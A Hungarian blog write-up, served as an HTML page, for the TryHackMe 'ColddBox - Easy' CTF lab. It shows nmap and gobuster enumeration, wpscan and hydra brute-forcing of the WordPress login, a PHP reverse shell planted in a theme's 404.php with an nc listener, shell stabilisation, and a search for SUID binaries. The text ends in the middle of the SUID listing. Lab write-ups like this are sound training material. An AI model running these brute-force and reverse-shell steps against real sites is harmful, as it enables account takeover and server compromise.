@@ -1,0 +1,275 @@
+<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="ColddBox - Easy" /><meta property="og:locale" content="en_US" /><meta name="description" content="Tryhackme room link: Simple CTF" /><meta property="og:description" content="Tryhackme room link: Simple CTF" /><link rel="canonical" href="/posts/colddbox-easy/" /><meta property="og:url" content="/posts/colddbox-easy/" /><meta property="og:site_name" content="Ther314m’s Writeups" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-07-15T06:00:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="ColddBox - Easy" /><meta name="twitter:site" content="@ther314m" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"Tryhackme room link: Simple CTF","headline":"ColddBox - Easy","dateModified":"2021-07-21T03:46:42+08:00","url":"/posts/colddbox-easy/","datePublished":"2021-07-15T06:00:00+08:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/colddbox-easy/"},"@context":"https://schema.org"}</script><title>ColddBox - Easy | Ther314m's Writeups</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Ther314m's Writeups"><meta name="application-name" content="Ther314m's Writeups"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://avatars.githubusercontent.com/u/87277616?s=400&u=1651050ff66bc400802762faefe2452312c06aa3&v=4" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Ther314m's Writeups</a></div><div class="site-subtitle font-italic">Writeups, hacking and more.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>KATEGÓRIÁK</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHÍVUM</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>INFO</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/ther314m" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/ther314m" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['ther314m','protonmail.ch'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span id="mode-toggle-wrapper" class="order-1"> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>ColddBox - Easy</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>ColddBox - Easy</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> ther314m </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Thu, Jul 15, 2021, 6:00 AM +0800" prep="on" > Jul 15 <i class="unloaded">2021-07-15T06:00:00+08:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Tue, Jul 20, 2021, 9:46 PM +0200" prefix="Updated " > Jul 20 <i class="unloaded">2021-07-21T03:46:42+08:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1720 words">9 min</span></div></div><div class="post-content"> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://tryhackme-images.s3.amazonaws.com/room-icons/442c3b7bab5e3f52b5341cfa9e52e5c0.png" class="preview-img" alt="image alternative text"><h2 id="tryhackme-room-link">Tryhackme room link:</h2><blockquote><p><a href="https://tryhackme.com/room/colddboxeasy"><code class="language-plaintext highlighter-rouge">Simple CTF</code></a></p></blockquote><h1 style="color: #a9db92 ;"><b>IP</b></h1><p>Hogy ne felejtsük el, exportáljuk a <code class="language-plaintext highlighter-rouge">tryhackme</code>-s <code class="language-plaintext highlighter-rouge">IP</code>-t az adott terminálba.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="nb">export </span><span class="nv">IP</span><span class="o">=</span>&lt;Tryhackme room IP&gt;
+</pre></table></code></div></div><h1 style="color: #a9db92 ;"><b>ENUMERÁCIÓ</b></h1><p>Futtassunk egy <code class="language-plaintext highlighter-rouge">nmap</code>-et, scanneljük le a hálózatot:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>nmap <span class="nt">-sCV</span> <span class="nt">-A</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-vv</span> <span class="nt">-oA</span> colddbox.easy <span class="nv">$IP</span>
+</pre></table></code></div></div><p>Kimenet:</p><pre><code class="language-report">[...]
+
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-generator: WordPress 4.1.31
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: ColddBox | One more machine
+4512/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 4e:bf:98:c0:9b:c5:36:80:8c:96:e8:96:95:65:97:3b (RSA)
+|   256 88:17:f1:a8:44:f7:f8:06:2f:d3:4f:73:32:98:c7:c5 (ECDSA)
+|_  256 f2:fc:6c:75:08:20:b1:b2:51:2d:94:d6:94:d7:51:4f (ED25519)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+[...]
+</code></pre><p>Láthatjuk, hogy egy <code class="language-plaintext highlighter-rouge">Apache httpd 2.4.18</code> webserver fut a 80-as porton és egy <code class="language-plaintext highlighter-rouge">OpenSSH</code> kiszolgáló a 4512-es porton. Ha a colddbox-os <code class="language-plaintext highlighter-rouge">IP</code>-re látogatunk, akkor láthatjuk, hogy ez egy <code class="language-plaintext highlighter-rouge">WordPress</code> site:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/myimages/01.png" alt="image tooltip here" /></p><p>Ha legörgetünk a lap aljára, láthatjuk a jeleket:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/myimages/02.png" alt="image tooltip here" /></p><p>Egyébként számos más módszert alkalmazhattunk volna, hogy kiderítsük ezt. Például indíthattunk volna egy <code class="language-plaintext highlighter-rouge">gobuster</code>-t:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/wordlists/dirb/common.txt <span class="nt">-x</span> php,txt,html <span class="nt">-t</span> 20 <span class="nt">-u</span> http://<span class="nv">$IP</span>/
+</pre></table></code></div></div><p>kimenet:</p><pre><code class="language-report">===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.67.152/
+[+] Method:                  GET
+[+] Threads:                 20
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php,txt,html
+[+] Timeout:                 10s
+===============================================================
+2021/07/15 20:58:42 Starting gobuster in directory enumeration mode
+===============================================================
+/.hta                 (Status: 403) [Size: 277]
+/.hta.php             (Status: 403) [Size: 277]
+/.hta.txt             (Status: 403) [Size: 277]
+/.hta.html            (Status: 403) [Size: 277]
+/.htaccess            (Status: 403) [Size: 277]
+/.htaccess.php        (Status: 403) [Size: 277]
+/.htaccess.txt        (Status: 403) [Size: 277]
+/.htaccess.html       (Status: 403) [Size: 277]
+/.htpasswd            (Status: 403) [Size: 277]
+/.htpasswd.php        (Status: 403) [Size: 277]
+/.htpasswd.txt        (Status: 403) [Size: 277]
+/.htpasswd.html       (Status: 403) [Size: 277]
+/hidden               (Status: 301) [Size: 313] [--&gt; http://10.10.67.152/hidden/]
+/index.php            (Status: 301) [Size: 0] [--&gt; http://10.10.67.152/]         
+/index.php            (Status: 301) [Size: 0] [--&gt; http://10.10.67.152/]         
+/license.txt          (Status: 200) [Size: 19930]                                
+/readme.html          (Status: 200) [Size: 7173]                                 
+/server-status        (Status: 403) [Size: 277]                                  
+/wp-admin             (Status: 301) [Size: 315] [--&gt; http://10.10.67.152/wp-admin/]
+/wp-blog-header.php   (Status: 200) [Size: 0]                                      
+/wp-config.php        (Status: 200) [Size: 0]                                      
+/wp-links-opml.php    (Status: 200) [Size: 219]                                    
+/wp-content           (Status: 301) [Size: 317] [--&gt; http://10.10.67.152/wp-content/]
+/wp-includes          (Status: 301) [Size: 318] [--&gt; http://10.10.67.152/wp-includes/]
+/wp-load.php          (Status: 200) [Size: 0]                                         
+/wp-cron.php          (Status: 200) [Size: 0]                                         
+/wp-mail.php          (Status: 403) [Size: 2965]                                      
+/wp-settings.php      (Status: 500) [Size: 0]                                         
+/wp-signup.php        (Status: 302) [Size: 0] [--&gt; /wp-login.php?action=register]     
+/wp-login.php         (Status: 200) [Size: 2547]                                      
+/wp-trackback.php     (Status: 200) [Size: 135]                                       
+/xmlrpc.php           (Status: 200) [Size: 42]                                        
+/xmlrpc.php           (Status: 200) [Size: 42]                                        
+                                                                                      
+===============================================================
+2021/07/15 20:59:32 Finished
+===============================================================
+</code></pre><p>Itt is láthatjuk, hogy rengeteg <code class="language-plaintext highlighter-rouge">wp</code> előtagú mappa van a serveren. Egy kis tapasztalattal és általános ismerettel ebből következtethetünk, hogy ez egy <code class="language-plaintext highlighter-rouge">WordPress</code> site. Egyébként korábban mikor megnéztük az oldalt böngészőből, magából az oldal felépítéséből és kinézetéből is lehet már sejteni valamit. Találhatunk még valamit: A <code class="language-plaintext highlighter-rouge">/hidden</code> mappát. Túl sok használható infót mondjuk nem rejt.</p><hr /><h1 style="color: #a9db92 ;"><b>WordPress</b></h1><p>Mivel ez egy WordPress site, a <code class="language-plaintext highlighter-rouge">wpscan</code> nevű programot kell használnunk jelen esetben. A parancs a következő:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>wpscan <span class="nt">-e</span> <span class="nt">--url</span> http://<span class="nv">$IP</span>/ <span class="nt">--passwords</span> /usr/share/wordlists/rockyou.txt
+</pre></table></code></div></div><p>Kimenet:</p><pre><code class="language-report">_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.18
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://10.10.67.152/ [10.10.67.152]
+[+] Started: Thu Jul 15 21:28:33 2021
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://10.10.67.152/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://10.10.67.152/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://10.10.67.152/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 4.1.31 identified (Insecure, released on 2020-06-10).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://10.10.67.152/?feed=rss2, &lt;generator&gt;https://wordpress.org/?v=4.1.31&lt;/generator&gt;
+ |  - http://10.10.67.152/?feed=comments-rss2, &lt;generator&gt;https://wordpress.org/?v=4.1.31&lt;/generator&gt;
+
+[+] WordPress theme in use: twentyfifteen
+ | Location: http://10.10.67.152/wp-content/themes/twentyfifteen/
+ | Last Updated: 2021-03-09T00:00:00.000Z
+ | Readme: http://10.10.67.152/wp-content/themes/twentyfifteen/readme.txt
+ | [!] The version is out of date, the latest version is 2.9
+ | Style URL: http://10.10.67.152/wp-content/themes/twentyfifteen/style.css?ver=4.1.31
+ | Style Name: Twenty Fifteen
+ | Style URI: https://wordpress.org/themes/twentyfifteen
+ | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 1.0 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://10.10.67.152/wp-content/themes/twentyfifteen/style.css?ver=4.1.31, Match: 'Version: 1.0'
+
+[+] Enumerating Vulnerable Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
+ Checking Known Locations - Time: 00:00:03 &lt;==============================================================================================================================================================&gt; (355 / 355) 100.00% Time: 00:00:03
+[+] Checking Theme Versions (via Passive and Aggressive Methods)
+
+[i] No themes Found.
+
+[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
+ Checking Known Locations - Time: 00:00:28 &lt;============================================================================================================================================================&gt; (2575 / 2575) 100.00% Time: 00:00:28
+
+[i] No Timthumbs Found.
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:01 &lt;===============================================================================================================================================================&gt; (137 / 137) 100.00% Time: 00:00:01
+
+[i] No Config Backups Found.
+
+[+] Enumerating DB Exports (via Passive and Aggressive Methods)
+ Checking DB Exports - Time: 00:00:00 &lt;=====================================================================================================================================================================&gt; (71 / 71) 100.00% Time: 00:00:00
+
+[i] No DB Exports Found.
+
+[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)
+ Brute Forcing Attachment IDs - Time: 00:00:01 &lt;==========================================================================================================================================================&gt; (100 / 100) 100.00% Time: 00:00:01
+
+[i] No Medias Found.
+
+[+] Enumerating Users (via Passive and Aggressive Methods)
+ Brute Forcing Author IDs - Time: 00:00:00 &lt;================================================================================================================================================================&gt; (10 / 10) 100.00% Time: 00:00:00
+
+[i] User(s) Identified:
+
+[+] the cold in person
+ | Found By: Rss Generator (Passive Detection)
+
+[+] philip
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] c0ldd
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] hugo
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] Performing password attack on Wp Login against 4 user/s
+[SUCCESS] - c0ldd / 9876543210                                                                                                                                                                                                                
+^Cying the cold in person / servant Time: 00:24:55 &lt;                                                                                                                                                &gt; (59409 / 57378792)  0.10%  ETA: ??:??:??
+[!] Valid Combinations Found:
+ | Username: c0ldd, Password: 9876543210
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.                                                                                                                  &gt; (59414 / 57378792)  0.10%  ETA: ??:??:??
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Thu Jul 15 21:54:13 2021
+[+] Requests Done: 62714
+[+] Cached Requests: 10
+[+] Data Sent: 20.505 MB
+[+] Data Received: 217.963 MB
+[+] Memory used: 289.133 MB
+[+] Elapsed time: 00:25:40
+
+Scan Aborted: Canceled by User
+</code></pre><p>Megszakítottam a <code class="language-plaintext highlighter-rouge">brute force</code> támadást, mert a <code class="language-plaintext highlighter-rouge">wpscan</code> talált egy valid kombinációt: <code class="language-plaintext highlighter-rouge">c0ldd:9876543210</code>. Siker!</p><p>Na már most, a <code class="language-plaintext highlighter-rouge">wpscan</code> úgy tudta kivitelezni ezt szótár alapú kihasználást, hogy tudta, a <code class="language-plaintext highlighter-rouge">/wp-login.php</code> oldalon kell keresnie azt az űrlapot, amelyet most mi is megfogunk támadni, csak most egy másik módszerrel.</p><p>A <code class="language-plaintext highlighter-rouge">/wp-login.php</code>:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/myimages/04.png" alt="image tooltip here" /></p><p>A hydra segítségével <code class="language-plaintext highlighter-rouge">brute force</code> támadást hajtottam végre a bejelentkezési űrlappal szemben. <code class="language-plaintext highlighter-rouge">3.</code> módszerként megjegyezném, hogy ezt meg lehet tenni a <code class="language-plaintext highlighter-rouge">Burp Suite Repeater</code> segítségével is, de azt most nem fogom bemutatni, helyette csak az <code class="language-plaintext highlighter-rouge">intercept</code> részre lesz szükségünk.</p><blockquote><p>Lesz majd egy <code class="language-plaintext highlighter-rouge">Burpsuite</code>-os poszt, de most nem térek ki arra, hogyan kell elkapni egy <code class="language-plaintext highlighter-rouge">request</code>-et. Addig is <code class="language-plaintext highlighter-rouge">Google</code> a barátod. :)</p></blockquote><p>A <code class="language-plaintext highlighter-rouge">Burpsuite</code> segítségével elfogott bejelentkezési <code class="language-plaintext highlighter-rouge">POST request</code> így néz ki:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/myimages/03.png" alt="image tooltip here" /></p><p>Ez után végre tudjuk hajtani a támadást:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>hydra <span class="nt">-l</span> C0ldd <span class="nt">-P</span> /usr/share/wordlists/rockyou.txt <span class="nv">$IP</span> http-post-form <span class="s2">"/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=%2Fwp-admin%2F&amp;testcookie=1:F=incorrect"</span> <span class="nt">-V</span>
+</pre></table></code></div></div><p>Kimenet:</p><pre><code class="language-report">[...]
+
+[80][http-post-form] host: 10.10.67.152   login: C0ldd   password: 9876543210
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-15 22:24:16
+
+[...]
+</code></pre><p>Most jelentkezzünk be az <code class="language-plaintext highlighter-rouge">admin page</code>-en keresztül.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/myimages/05.png" alt="image tooltip here" /></p><hr /><h1 style="color: #a9db92 ;"><b>Reverse Shell</b></h1><p>Innen már egyszerű dolgunk van:</p><p>A <code class="language-plaintext highlighter-rouge">twentyfifteen</code> sablon <code class="language-plaintext highlighter-rouge">404.php</code> nevű fájljának teljes tartalmát kicseréljük egy PHP fordított shell forrására, és mentjük a módosításokat. Ajánlom a <code class="language-plaintext highlighter-rouge">Pentest Monkey</code> Reverse Shell Cheat Sheet-eket: <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php"><code class="language-plaintext highlighter-rouge">Pentest Monkey - PHP Reverse Shell Cheat Sheet</code></a>. Mivel a Wordpress <code class="language-plaintext highlighter-rouge">PHP</code>-ban íródott, nekünk is értelemszerűen ilyen <code class="language-plaintext highlighter-rouge">reverse shell</code>-t kell választanunk.</p><p>Kicsit módosítjuk a fájlt:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/myimages/06.png" alt="image tooltip here" /></p><p>Felülírjuk a <code class="language-plaintext highlighter-rouge">404.php</code> fájlt az admin page-en.</p><p>Ezután nyitunk egy <code class="language-plaintext highlighter-rouge">netcat</code> “figyelőt” és elkezdünk “hallgatózni” a <code class="language-plaintext highlighter-rouge">reverse shell</code>-ben megadott porton, majd megnyitjuk böngészővel a 404.php oldalt. (http://<Tryhackme-room-ip>/wp-content/themes/twentyfifteen/404.php).</Tryhackme-room-ip></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>nc <span class="nt">-lvnp</span> 4444
+</pre></table></code></div></div><p>Miután visszatekintünk a terminálunkra, egy <code class="language-plaintext highlighter-rouge">reverse shell</code> fogad bennünket. Ez nem egy teljes értékű <code class="language-plaintext highlighter-rouge">shell</code>, nem látjuk hol tartózkodunk a fájlrendszerben, nem tudunk “<code class="language-plaintext highlighter-rouge">TAB</code>-olni” és a <code class="language-plaintext highlighter-rouge">clear</code> parancs sem működik többek között. Eléggé korlátozottak így a lehetőségeink, nem biztos, hogy szükségünk lesznek ezekre a funkciókra, de javallott a shell <code class="language-plaintext highlighter-rouge">normalizálása</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/myimages/07.png" alt="image tooltip here" /></p><h1 id="normalizálás">Normalizálás:</h1><p>Kezdjünk egy <code class="language-plaintext highlighter-rouge">Python Cheat Sheet</code>-el:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>python3 <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
+</pre></table></code></div></div><p>Kimenet:</p><pre><code class="language-report">$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@ColddBox-Easy:/home/c0ldd$
+</code></pre><p>Ez már egy fokkal jobban néz ki, ugye? Bár még mindig nem az igazi, még mindig nem tudjuk használni az alapvető funkciókat sem, ezért:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
+^Z
+</pre></table></code></div></div><blockquote><p>A <code class="language-plaintext highlighter-rouge">CTRL+Z</code>-vel háttérbe helyezzük ezt a <code class="language-plaintext highlighter-rouge">shell</code>-t.</p></blockquote><p>Aztán a saját terminálunkba:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
+</pre></table></code></div></div><p>És ha használjuk pl.: az <code class="language-plaintext highlighter-rouge">id</code> vagy bármely más parancsot máris láthatjuk a munkánk gyümölcsét! Ezután használhatjuk a megszokott terminálos funkciók többségét.</p><hr /><h1 style="color: #a9db92 ;"><b>Privilege Escalation</b></h1><blockquote><p>Privilegizálás</p></blockquote><p>Mivel az <code class="language-plaintext highlighter-rouge">id</code> parancsal megtudtuk, hogy a <code class="language-plaintext highlighter-rouge">www-data</code> jogosultságaival fut az interaktív shellünk, sajnos nem tudjuk kiíratni a user.txt-t sem:</p><pre><code class="language-report">www-data@ColddBox-Easy:/home/c0ldd$ ls
+user.txt
+www-data@ColddBox-Easy:/home/c0ldd$ cat user.txt
+cat: user.txt: Permission denied
+www-data@ColddBox-Easy:/home/c0ldd$ 
+</code></pre><p>Próbáljunk meg valahogy belépni egy NEM <code class="language-plaintext highlighter-rouge">rendszer-felhasználó</code>-val, <code class="language-plaintext highlighter-rouge">c0ldd</code> esetleg <code class="language-plaintext highlighter-rouge">root</code>.</p><p>Keressünk <code class="language-plaintext highlighter-rouge">binárisokat</code> a <code class="language-plaintext highlighter-rouge">suid</code> bitkészlettel.</p><blockquote><p>Ez lehetővé teszi, hogy a root tulajdonában lévő bináris fájlokat futtassuk rootként, a <code class="language-plaintext highlighter-rouge">sudo</code> használata nélkül</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>find / <span class="nt">-perm</span> <span class="nt">-4000</span> 2&gt;/dev/null
+</pre></table></code></div></div><p>Kimenet:</p><pre><code class="language-report">www-data@ColddBox-Easy:/home/c0ldd$ find / -perm -4000 2&gt;/dev/null
+/bin/su
+/bin/ping6
+/bin/ping
+/bin/fusermount
+/bin/umount
+/bin/mount
+/usr/bin/chsh
+/usr/bin/gpasswd
+/usr/bin/pkexec
+/usr/bin/find
+/usr/bin/sudo
+/usr/bin/newgidmap
+/usr/bin/newgrp
+/usr/bin/at
+/usr/bin/newuidmap
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/lib/openssh/ssh-keysign
+/usr/lib/snapd/snap-confine
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
